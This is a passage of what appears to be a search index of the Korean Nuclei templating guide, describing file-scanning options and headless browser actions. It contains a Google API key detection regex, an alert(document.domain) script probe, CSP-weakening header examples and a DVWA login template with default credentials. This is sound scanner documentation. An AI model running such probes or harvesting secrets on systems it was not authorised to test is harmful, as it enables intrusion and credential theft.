\ud655\uc7a5 \ud504\ub85c\uadf8\ub7a8\uc758 \uac70\ubd80 \ubaa9\ub85d\ub3c4 \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub7ec\ud55c \ud655\uc7a5\uc790\ub97c \uac00\uc9c4 \ud30c\uc77c\uc740 nuclei\uc5d0\uc11c \ucc98\ub9ac\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. extensions : - all denylist : - go - py - txt \uae30\ubcf8\uc801\uc73c\ub85c \ud2b9\uc815 \ud655\uc7a5\uc790\ub294 nuclei \ud30c\uc77c \ubaa8\ub4c8\uc5d0\uc11c \uc81c\uc678\ub429\ub2c8\ub2e4. \uc774\ub4e4\uc758 \ubaa9\ub85d\uc740 \uc544\ub798\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4- 3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip More Options \u00b6 max-size \ub9e4\uac1c\ubcc0\uc218\ub294 nuclei \uc5d4\uc9c4\uc774 \uc77d\ub294 \ud30c\uc77c\uc758 \ucd5c\ub300 \ud06c\uae30(\ubc14\uc774\ud2b8)\ub97c \uc81c\ud55c\ud558\ub294 \ub9e4\uac1c\ubcc0\uc218\ub97c \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c max-size \uac12\uc740 5MB(5242880)\uc774\uba70 max-size \ubcf4\ub2e4 \ud070 \ud30c\uc77c\uc740 \ucc98\ub9ac\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. no-recursive \uc635\uc158\uc740 \uc785\ub825\uc774 nuclei\uc758 \ud30c\uc77c \ubaa8\ub4c8\uc5d0 \ub300\ud574 \ucc98\ub9ac\ub418\ub294 \ub3d9\uc548 \ub514\ub809\ud1a0\ub9ac/\uae00\ub85c\ube0c\uc758 \uc7ac\uadc0\uc801 \uc6cc\ud0b9\uc744 \ube44\ud65c\uc131\ud654\ud569\ub2c8\ub2e4. Matchers / Extractor \u00b6 File \ud504\ub85c\ud1a0\ucf5c\uc740 2\uac00\uc9c0 \uc720\ud615\uc758 Matchers\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. - Matcher Type Part Matched word all regex all Extractors Type Part Matched word all regex all Example File Template \u00b6 \uac1c\uc778 \ud0a4 \uac10\uc9c0\ub97c \uc704\ud55c \ucd5c\uc885 \uc608\uc81c \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \uc544\ub798\uc5d0 \ub098\uc640 \uc788\uc2b5\ub2c8\ub2e4. id : google-api-key info : name : Google API Key author : pdteam severity : info file : - extensions : - all - txt extractors : - type : regex name : google-api-key regex : - \"AIza[0-9A-Za-z\\\\-_]{35}\" # http-response/ \ub514\ub809\ud1a0\ub9ac\uc5d0\uc11c \ud30c\uc77c \ud15c\ud50c\ub9bf \uc2e4\ud589 nuclei -t file.yaml -target http-response/ # output.txt\uc5d0\uc11c \ud30c\uc77c \ud15c\ud50c\ub9bf \uc2e4\ud589 nuclei -t file.yaml -target output.txt \ub354 \uc644\uc804\ud55c \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. here","title":"File"},{"location":"kr/templating-guide/protocols/file/#file-requests","text":"Nuclei\ub294 \ud30c\uc77c \uc2dc\uc2a4\ud15c\uc5d0\uc11c\ub3c4 \uc77c\uce58/\ucd94\ucd9c\ud560 \uc218 \uc788\ub294 \ubaa8\ub378\ub9c1 \ud15c\ud50c\ub9bf\uc744 \ud5c8\uc6a9\ud569\ub2c8\ub2e4. # Start of file template block file :","title":"File Requests"},{"location":"kr/templating-guide/protocols/file/#extensions","text":"\ubaa8\ub4e0 \ud655\uc7a5\uc790(\uae30\ubcf8 \uac70\ubd80 \ubaa9\ub85d\uc5d0 \uc788\ub294 \ud655\uc7a5\uc790 \uc81c\uc678)\uc5d0\uc11c \uc77c\uce58\uc2dc\ud0a4\ub824\uba74 \ub2e4\uc74c\uc744 \uc0ac\uc6a9\ud558\uc2ed\uc2dc\uc624. extensions : - all \uc77c\uce58\ud574\uc57c \ud558\ub294 \uc0ac\uc6a9\uc790 \uc9c0\uc815 \ud655\uc7a5 \ubaa9\ub85d\uc744 \uc81c\uacf5\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. extensions : - py - go \ud655\uc7a5 \ud504\ub85c\uadf8\ub7a8\uc758 \uac70\ubd80 \ubaa9\ub85d\ub3c4 \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub7ec\ud55c \ud655\uc7a5\uc790\ub97c \uac00\uc9c4 \ud30c\uc77c\uc740 nuclei\uc5d0\uc11c \ucc98\ub9ac\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. extensions : - all denylist : - go - py - txt \uae30\ubcf8\uc801\uc73c\ub85c \ud2b9\uc815 \ud655\uc7a5\uc790\ub294 nuclei \ud30c\uc77c \ubaa8\ub4c8\uc5d0\uc11c \uc81c\uc678\ub429\ub2c8\ub2e4. \uc774\ub4e4\uc758 \ubaa9\ub85d\uc740 \uc544\ub798\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4- 3g2,3gp,7z,apk,arj,avi,axd,bmp,css,csv,deb,dll,doc,drv,eot,exe,flv,gif,gifv,gz,h264,ico,iso,jar,jpeg,jpg,lock,m4a,m4v,map,mkv,mov,mp3,mp4,mpeg,mpg,msi,ogg,ogm,ogv,otf,pdf,pkg,png,ppt,psd,rar,rm,rpm,svg,swf,sys,tar,tar.gz,tif,tiff,ttf,txt,vob,wav,webm,wmv,woff,woff2,xcf,xls,xlsx,zip","title":"Extensions"},{"location":"kr/templating-guide/protocols/file/#more-options","text":"max-size \ub9e4\uac1c\ubcc0\uc218\ub294 nuclei \uc5d4\uc9c4\uc774 \uc77d\ub294 \ud30c\uc77c\uc758 \ucd5c\ub300 \ud06c\uae30(\ubc14\uc774\ud2b8)\ub97c \uc81c\ud55c\ud558\ub294 \ub9e4\uac1c\ubcc0\uc218\ub97c \uc81c\uacf5\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c max-size \uac12\uc740 5MB(5242880)\uc774\uba70 max-size \ubcf4\ub2e4 \ud070 \ud30c\uc77c\uc740 \ucc98\ub9ac\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. no-recursive \uc635\uc158\uc740 \uc785\ub825\uc774 nuclei\uc758 \ud30c\uc77c \ubaa8\ub4c8\uc5d0 \ub300\ud574 \ucc98\ub9ac\ub418\ub294 \ub3d9\uc548 \ub514\ub809\ud1a0\ub9ac/\uae00\ub85c\ube0c\uc758 \uc7ac\uadc0\uc801 \uc6cc\ud0b9\uc744 \ube44\ud65c\uc131\ud654\ud569\ub2c8\ub2e4.","title":"More Options"},{"location":"kr/templating-guide/protocols/file/#matchers-extractor","text":"File \ud504\ub85c\ud1a0\ucf5c\uc740 2\uac00\uc9c0 \uc720\ud615\uc758 Matchers\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. - Matcher Type Part Matched word all regex all Extractors Type Part Matched word all regex all","title":"Matchers / Extractor"},{"location":"kr/templating-guide/protocols/file/#example-file-template","text":"\uac1c\uc778 \ud0a4 \uac10\uc9c0\ub97c \uc704\ud55c \ucd5c\uc885 \uc608\uc81c \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \uc544\ub798\uc5d0 \ub098\uc640 \uc788\uc2b5\ub2c8\ub2e4. id : google-api-key info : name : Google API Key author : pdteam severity : info file : - extensions : - all - txt extractors : - type : regex name : google-api-key regex : - \"AIza[0-9A-Za-z\\\\-_]{35}\" # http-response/ \ub514\ub809\ud1a0\ub9ac\uc5d0\uc11c \ud30c\uc77c \ud15c\ud50c\ub9bf \uc2e4\ud589 nuclei -t file.yaml -target http-response/ # output.txt\uc5d0\uc11c \ud30c\uc77c \ud15c\ud50c\ub9bf \uc2e4\ud589 nuclei -t file.yaml -target output.txt \ub354 \uc644\uc804\ud55c \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. here","title":"Example File Template"},{"location":"kr/templating-guide/protocols/headless/","text":"Headless Requests \u00b6 Nuclei\ub294 \uac04\ub2e8\ud55c DSL\ub85c \ube0c\ub77c\uc6b0\uc800 \uc790\ub3d9\ud654\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. headless \ube0c\ub77c\uc6b0\uc800 \uc5d4\uc9c4\uc740 \uc644\uc804\ud788 \uc0ac\uc6a9\uc790 \uc815\uc758\ud560 \uc218 \uc788\uc73c\uba70 \uc0ac\uc6a9\uc790 \uc791\uc5c5\uc744 \uc2a4\ud06c\ub9bd\ud305\ud558\uc5ec \ube0c\ub77c\uc6b0\uc800\ub97c \uc644\ubcbd\ud558\uac8c \uc81c\uc5b4\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 \ub2e4\uc591\ud55c \uace0\uc720\ud55c \uc0ac\uc6a9\uc790 \uc9c0\uc815 \uc6cc\ud06c\ud50c\ub85c\ub97c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. headless : Actions \u00b6 Action\uc740 Nuclei Headless Engine\uc744 \uc704\ud55c \ub2e8\uc77c \uc791\uc5c5\uc785\ub2c8\ub2e4. \uac01 \uc791\uc5c5\uc740 \uc5b4\ub5a4 \ubc29\uc2dd\uc73c\ub85c\ub4e0 \ube0c\ub77c\uc6b0\uc800 \uc0c1\ud0dc\ub97c \uc870\uc791\ud558\uace0 \ub9c8\uce68\ub0b4 \ucea1\ucc98\ud558\ub824\ub294 \uc0c1\ud0dc\ub85c \uc774\uc5b4\uc9d1\ub2c8\ub2e4. Nuclei\ub294 \ub2e4\uc591\ud55c \uc791\uc5c5\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \uc791\uc5c5 \ubaa9\ub85d\uacfc \ud574\ub2f9 \uc778\uc218\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. navigate \u00b6 \uc8fc\uc5b4\uc9c4 URL\uc744 \ud0d0\uc0c9\ud569\ub2c8\ub2e4. url \ud544\ub4dc\ub294 {{BaseURL}} , {{Hostname}} \uacfc \uac19\uc740 \ubcc0\uc218\ub97c \uc9c0\uc6d0\ud558\uc5ec \uc694\uccad\uc744 \uc644\uc804\ud788 \uc0ac\uc6a9\uc790 \uc815\uc758\ud569\ub2c8\ub2e4. action : navigate args : url : \"{{BaseURL}} script \u00b6 \uc2a4\ud06c\ub9bd\ud2b8\ub294 \ud604\uc7ac \ube0c\ub77c\uc6b0\uc800 \ud398\uc774\uc9c0\uc5d0\uc11c JS \ucf54\ub4dc\ub97c \uc2e4\ud589\ud569\ub2c8\ub2e4. \uac00\uc7a5 \uac04\ub2e8\ud55c \uc218\uc900\uc5d0\uc11c \uc2e4\ud589\ud558\ub824\ub294 JS snippet\uacfc \ud568\uaed8 code \uc778\uc218\ub97c \uc81c\uacf5\ud558\uba74 \ud398\uc774\uc9c0\uc5d0\uc11c \uc2e4\ud589\ub429\ub2c8\ub2e4. action : script args : code : alert(document.domain) \uac12\uc744 \uac80\uc0ac\ud558\uae30 \uc704\ud574 JS \uac1d\uccb4\uc5d0\uc11c \ub9e4\ucc98\ub97c \uc2e4\ud589\ud558\uace0 \uc2f6\ub2e4\uace0 \uac00\uc815\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \uc720\ud615\uc758 \ub370\uc774\ud130 \ucd94\ucd9c \uc0ac\uc6a9 \uc0ac\ub840\ub294 nuclei headless\uc5d0\uc11c\ub3c4 \uc9c0\uc6d0\ub429\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc774 window.random-object \ub77c\ub294 \uac1c\uccb4\ub97c \uac12\uc73c\ub85c \uc124\uc815\ud558\uace0 \ud574\ub2f9 \uac12\uacfc \uc77c\uce58\uc2dc\ud0a4\ub824\uace0 \ud55c\ub2e4\uace0 \uac00\uc815\ud574 \ubcf4\uaca0\uc2b5\ub2c8\ub2e4. - action : script args : code : window.random-object name : script-name ... matchers : - type : word part : script-name words : - \"some-value\" Nuclei\ub294 hook \uc778\uc218\ub85c \ud398\uc774\uc9c0\ub97c \ub85c\ub4dc\ud558\uae30 \uc804\uc5d0 \uc77c\ubd80 \uc0ac\uc6a9\uc790 \uc815\uc758 \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \ud398\uc774\uc9c0\uac00 \ub85c\ub4dc\ub418\uae30 \uc804\uc5d0 \ud56d\uc0c1 \uc81c\uacf5\ub41c \uc790\ubc14\uc2a4\ud06c\ub9bd\ud2b8\ub97c \uc2e4\ud589\ud569\ub2c8\ub2e4. \uc608\uc81c\ub294 \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0\uc11c \uc0dd\uc131\ub41c \uacbd\uace0\uac00 \ud06c\ub864\ub7ec\ub97c \uc911\uc9c0\ud558\uc9c0 \uc54a\ub3c4\ub85d window.alert \ub97c \ud6c4\ud06c\ud569\ub2c8\ub2e4. - action : script args : code : (function() { window.alert=function(){} })() hook : true \uc774\uac83\uc740 \ud558\ub098\uc758 \uc0ac\uc6a9 \uc0ac\ub840\uc774\uba70 DOM XSS \uac10\uc9c0 \ubc0f Javascript-Injection \uae30\ubc18 \ud14c\uc2a4\ud2b8 \uae30\uc220\uacfc \uac19\uc740 \uae30\ub2a5 \ud6c4\ud0b9\uc758 \uc0ac\uc6a9 \uc0ac\ub840\uac00 \ub354 \ub9ce\uc2b5\ub2c8\ub2e4. \ucd94\uac00 \uc608\uc81c\ub294 \uc608\uc81c \ud398\uc774\uc9c0\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4. click \u00b6 \ud074\ub9ad\uc740 \uc120\ud0dd\uae30\ub85c \uc9c0\uc815\ub41c \uc694\uc18c\ub97c \ub9c8\uc6b0\uc2a4 \uc67c\ucabd \ubc84\ud2bc\uc73c\ub85c \ud074\ub9ad\ud558\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. action : click args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input Nuclei\ub294 XPath, Regex, CSS \ub4f1\uc744 \ud3ec\ud568\ud558\ub418 \uc774\uc5d0 \uad6d\ud55c\ub418\uc9c0 \uc54a\ub294 \ub2e4\uc591\ud55c \uc120\ud0dd\uae30 \uc720\ud615\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc120\ud0dd\uae30\uc5d0 \ub300\ud55c \uc790\uc138\ud55c \ub0b4\uc6a9\uc740 here . rightclick \u00b6 RightClick\uc740 \uc120\ud0dd\uae30\ub85c \uc9c0\uc815\ub41c \uc694\uc18c\ub97c \ub9c8\uc6b0\uc2a4 \uc624\ub978\ucabd \ubc84\ud2bc\uc73c\ub85c \ud074\ub9ad\ud558\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. action : rightclick args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input text \u00b6 \ud14d\uc2a4\ud2b8\ub294 \ud0a4\ubcf4\ub4dc\ub85c \uc785\ub825\uc5d0 \ubb34\uc5b8\uac00\ub97c \uc785\ub825\ud558\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. \uc120\ud0dd\uae30\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc785\ub825\ud560 \uc694\uc18c\ub97c \uc9c0\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. action : text args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : username screenshot \u00b6 \uc2a4\ud06c\ub9b0\uc0f7\uc740 \ud398\uc774\uc9c0\uc758 \uc2a4\ud06c\ub9b0\uc0f7\uc744 \ucc0d\uc5b4 \ub514\uc2a4\ud06c\uc5d0 \uc501\ub2c8\ub2e4. \uc804\uccb4 \ud398\uc774\uc9c0\uc640 \uc77c\ubc18 \uc2a4\ud06c\ub9b0\uc0f7\uc744 \ubaa8\ub450 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. action : screenshot args : to : /root/test/screenshot-web \uc804\uccb4 \ud398\uc774\uc9c0 \uc2a4\ud06c\ub9b0\uc0f7\uc774 \ud544\uc694\ud55c \uacbd\uc6b0 \uc778\uc218\uc5d0 fullpage: true \uc635\uc158\uc744 \uc0ac\uc6a9\ud558\uba74 \ub429\ub2c8\ub2e4. action : screenshot args : to : /root/test/screenshot-web fullpage : true time \u00b6 \uc2dc\uac04\uc740 RFC3339 \ud615\uc2dd\uc758 \ud398\uc774\uc9c0\uc5d0\uc11c \uc2dc\uac04 \uc785\ub825\uc5d0 \uac12\uc744 \uc785\ub825\ud569\ub2c8\ub2e4. action : time args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : 2006-01-02T15:04:05Z07:00 select \u00b6 select\uc740 selection\uc5d0 \uc758\ud574 HTML \uc785\ub825\uc5d0 \ub300\ud55c selector\uc744 \uc218\ud589\ud569\ub2c8\ub2e4. action : select args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input selected : true value : option[value=two] selector : regex files \u00b6 Files\ub294 \uc6f9\ud398\uc774\uc9c0\uc5d0\uc11c \ud30c\uc77c \uc5c5\ub85c\ub4dc \uc785\ub825\uc744 \ucc98\ub9ac\ud569\ub2c8\ub2e4. action : files args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input value : /root/test/payload.txt waitload \u00b6 WaitLoads\ub294 \ud398\uc774\uc9c0\uac00 \ub85c\ub4dc\ub97c \uc644\ub8cc\ud558\uace0 \uc720\ud734 \uc0c1\ud0dc\uac00 \ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. action : waitload Nuclei\uc758 waitload \uc791\uc5c5\uc740 DOM\uc774 \ub85c\ub4dc\ub418\uae30\ub97c \uae30\ub2e4\ub9ac\uace0 window.onload \uc774\ubca4\ud2b8\uac00 \uc218\uc2e0\ub418\uae30\ub97c \uae30\ub2e4\ub9b0 \ud6c4 \ud398\uc774\uc9c0\uac00 1\ucd08 \ub3d9\uc548 \uc720\ud734 \uc0c1\ud0dc\uac00 \ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. getresource \u00b6 GetResource\ub294 \uc694\uc18c\uc5d0 \ub300\ud55c src \uc18d\uc131\uc744 \ubc18\ud658\ud569\ub2c8\ub2e4. action : getresource name : extracted-value-src args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input extract \u00b6 Extract\ub294 HTML \ub178\ub4dc\uc758 \ud14d\uc2a4\ud2b8 \ub610\ub294 \uc0ac\uc6a9\uc790\uac00 \uc9c0\uc815\ud55c \uc18d\uc131\uc744 \ucd94\ucd9c\ud569\ub2c8\ub2e4. \uc544\ub798 \ucf54\ub4dc\ub294 \uc9c0\uc815\ub41c XPath \uc120\ud0dd\uae30 \uc694\uc18c\uc5d0 \ub300\ud55c \ud14d\uc2a4\ud2b8\ub97c \ucd94\ucd9c\ud569\ub2c8\ub2e4. \uadf8\ub7ec\uba74 \ub9e4\ucc98 \ubc0f \ucd94\ucd9c\uae30\uc640 \ud568\uaed8 extracted-value \uc774\ub77c\ub294 \uc774\ub984\uc73c\ub85c \uc77c\uce58\ub420 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. action : extract name : extracted-value args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input \uc694\uc18c\uc5d0 \ub300\ud55c \uc18d\uc131\ub3c4 \ucd94\ucd9c\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4 - action : extract name : extracted-value-href args : by : xpath xpath : /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input target : attribute attribute : href setmethod \u00b6 SetMethod\ub294 \uc694\uccad\uc5d0 \ub300\ud55c \uba54\uc11c\ub4dc\ub97c \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4. action : setmethod args : part : request method : DELETE addheader \u00b6 AddHeader\ub294 \uc694\uccad/\uc751\ub2f5\uc5d0 \ud5e4\ub354\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \uae30\uc874 \ud5e4\ub354\ub97c \ub36e\uc5b4\uc4f0\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. action : addheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" setheader \u00b6 SetHeader\ub294 \uc694\uccad/\uc751\ub2f5\uc5d0 \ud5e4\ub354\ub97c \uc124\uc815\ud569\ub2c8\ub2e4. action : setheader args : part : response # can be request too key : Content-Security-Policy value : \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" deleteheader \u00b6 \ud5e4\ub354 \uc0ad\uc81c\ub294 \uc694\uccad/\uc751\ub2f5\uc5d0\uc11c \ud5e4\ub354\ub97c \uc0ad\uc81c\ud569\ub2c8\ub2e4. action : deleteheader args : part : response # can be request too key : Content-Security-Policy setbody \u00b6 SetBody\ub294 \uc694\uccad/\uc751\ub2f5\uc758 \ubcf8\ubb38\uc744 \uc124\uc815\ud569\ub2c8\ub2e4. action : setbody args : part : response # can be request too body : '{\"success\":\"ok\"}' waitevent \u00b6 WaitEvent\ub294 \ud398\uc774\uc9c0\uc5d0\uc11c \uc774\ubca4\ud2b8\uac00 \ud2b8\ub9ac\uac70\ub420 \ub54c\uae4c\uc9c0 \uae30\ub2e4\ub9bd\ub2c8\ub2e4. action : waitevent args : event : 'Page.loadEventFired' \uc9c0\uc6d0\ub418\ub294 \uc774\ubca4\ud2b8 \ubaa9\ub85d\uc740 here \uc5d0 \ub098\uc640 \uc788\uc2b5\ub2c8\ub2e4. keyboard \u00b6 \ud0a4\ubcf4\ub4dc\ub294 \ud0a4\ubcf4\ub4dc\uc758 \ub2e8\uc77c \ud0a4 \ub204\ub974\uae30\ub97c \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. action : keyboard args : keys : '\\r' # \uc774\uac83\uc740 \ud0a4\ubcf4\ub4dc\uc5d0\uc11c Enter \ud0a4\ub97c \ub204\ub974\ub294 \uac83\uc744 \uc2dc\ubbac\ub808\uc774\uc158\ud569\ub2c8\ub2e4. 'keys' \uc778\uc218\ub294 \ud0a4 \ucf54\ub4dc\ub97c \ud5c8\uc6a9\ud569\ub2c8\ub2e4. debug \u00b6 \ub514\ubc84\uadf8\ub294 \uac01 \ud5e4\ub4dc\ub9ac\uc2a4 \uc791\uc5c5 \uc0ac\uc774\uc5d0 5\ucd08\uc758 \uc9c0\uc5f0\uc744 \ucd94\uac00\ud558\uace0 \ube0c\ub77c\uc6b0\uc800\uc5d0\uc11c \ubc1c\uc0dd\ud558\ub294 \ubaa8\ub4e0 \ud5e4\ub4dc\ub9ac\uc2a4 \uc774\ubca4\ud2b8\uc758 \ucd94\uc801\ub3c4 \ud45c\uc2dc\ud569\ub2c8\ub2e4. \ucc38\uace0: \ub514\ubc84\uae45 \ubaa9\uc801\uc73c\ub85c\ub9cc \uc0ac\uc6a9\ud558\uace0 \ud504\ub85c\ub355\uc158 \ud15c\ud50c\ub9bf\uc5d0\uc11c\ub294 \uc0ac\uc6a9\ud558\uc9c0 \ub9c8\uc2ed\uc2dc\uc624. action : debug sleep \u00b6 \uc808\uc804 \ubaa8\ub4dc\ub294 \ube0c\ub77c\uc6b0\uc800\uac00 \uc9c0\uc815\ub41c \uc2dc\uac04(\ucd08) \ub3d9\uc548 \uae30\ub2e4\ub9ac\uac8c \ud569\ub2c8\ub2e4. \uc774\uac83\uc740 \ub514\ubc84\uae45 \ubaa9\uc801\uc73c\ub85c\ub3c4 \uc720\uc6a9\ud569\ub2c8\ub2e4. action : sleep args : duration : 5 Selectors \u00b6 \uc120\ud0dd\uae30\ub294 nuclei \ud5e4\ub4dc\ub9ac\uc2a4 \uc5d4\uc9c4\uc774 \uc791\uc5c5\uc744 \uc2e4\ud589\ud560 \uc694\uc18c\ub97c \uc2dd\ubcc4\ud558\ub294 \ubc29\ubc95\uc785\ub2c8\ub2e4. Nuclei\ub294 \ub2e4\uc591\ud55c \uc635\uc158\uc744 \ud3ec\ud568\ud558\uc5ec \uc120\ud0dd\uae30 \uac00\uc838\uc624\uae30\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Selector Description r / regex Element matches CSS Selector and Text Matches Regex x / xpath Element matches XPath selector js Return elements from a JS function search Search for a query (can be text, XPATH, CSS) selector (default) Element matches CSS Selector Matchers / Extractor Parts \u00b6 Matchers/Extractor\uc6a9 Headless \ud504\ub85c\ud1a0\ucf5c\uc774 \uc9c0\uc6d0\ud558\ub294 \uc720\ud6a8\ud55c part \uac12\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. Value Description request Headless Request <out_names> Action names with stored values raw / body / data Final DOM response from browser Example Headless Template \u00b6 DVWA\uc5d0 \uc790\ub3d9\uc73c\ub85c \ub85c\uadf8\uc778\ud558\ub294 \ud5e4\ub4dc\ub9ac\uc2a4 \ud15c\ud50c\ub9bf\uc758 \uc608\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. id : dvwa-headless-automatic-login info : name : DVWA Headless Automatic Login author : pdteam severity : high headless : - steps : - args : url : \"{{BaseURL}}/login.php\" action : navigate - action : waitload - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input action : click - action : waitload - args : by : xpath value : admin xpath : /html/body/div/div[2]/form/fieldset/input action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/input[2] action : click - action : waitload - args : by : xpath value : password xpath : /html/body/div/div[2]/form/fieldset/input[2] action : text - args : by : xpath xpath : /html/body/div/div[2]/form/fieldset/p/input action : click - action : waitload matchers : - part : resp type : word words : - \"You have logged in as\" \ub354 \uc644\uc804\ud55c \uc608\uac00 \uc81c\uacf5\ub429\ub2c8\ub2e4. here","title":"Headless"},{"location":"kr/templating-guide/protocols/headless/#headless-requests","text":"Nuclei\ub294 \uac04\ub2e8\ud55c DSL\ub85c \ube0c\ub77c\uc6b0\uc800 \uc790\ub3d9\ud654\ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. headless \ube0c\ub77c\uc6b0\uc800 \uc5d4\uc9c4\uc740 \uc644\uc804\ud788 \uc0ac\uc6a9\uc790 \uc815\uc758\ud560 \uc218 \uc788\uc73c\uba70 \uc0ac\uc6a9\uc790 \uc791\uc5c5\uc744 \uc2a4\ud06c\ub9bd\ud305\ud558\uc5ec \ube0c\ub77c\uc6b0\uc800\ub97c \uc644\ubcbd\ud558\uac8c \uc81c\uc5b4\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 \ub2e4\uc591\ud55c \uace0\uc720\ud55c \uc0ac\uc6a9\uc790 \uc9c0\uc815 \uc6cc\ud06c\ud50c\ub85c\ub97c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. # \ud15c\ud50c\ub9bf \uc694\uccad\uc744 \ubc14\ub85c \uc5ec\uae30\uc5d0\uc11c \uc2dc\uc791\ud558\uc138\uc694. headless :","title":"Headless Requests"},{"location":"kr/templating-guide/protocols/headless/#actions","text":"Action\uc740 Nuclei Headless Engine\uc744 \uc704\ud55c \ub2e8\uc77c \uc791\uc5c5\uc785\ub2c8\ub2e4. \uac01 \uc791\uc5c5\uc740 \uc5b4\ub5a4 \ubc29\uc2dd\uc73c\ub85c\ub4e0 \ube0c\ub77c\uc6b0\uc800 \uc0c1\ud0dc\ub97c \uc870\uc791\ud558\uace0 \ub9c8\uce68\ub0b4 \ucea1\ucc98\ud558\ub824\ub294 \uc0c1\ud0dc\ub85c \uc774\uc5b4\uc9d1\ub2c8\ub2e4. Nuclei\ub294 \ub2e4\uc591\ud55c \uc791\uc5c5\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \uc791\uc5c5 \ubaa9\ub85d\uacfc \ud574\ub2f9 \uc778\uc218\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4.","title":"Actions"},{"location":"kr/templating-guide/protocols/headless/#navigate","text":"\uc8fc\uc5b4\uc9c4 URL\uc744 \ud0d0\uc0c9\ud569\ub2c8\ub2e4. url \ud544\ub4dc\ub294 {{BaseURL}} , {{Hostname}} \uacfc \uac19\uc740 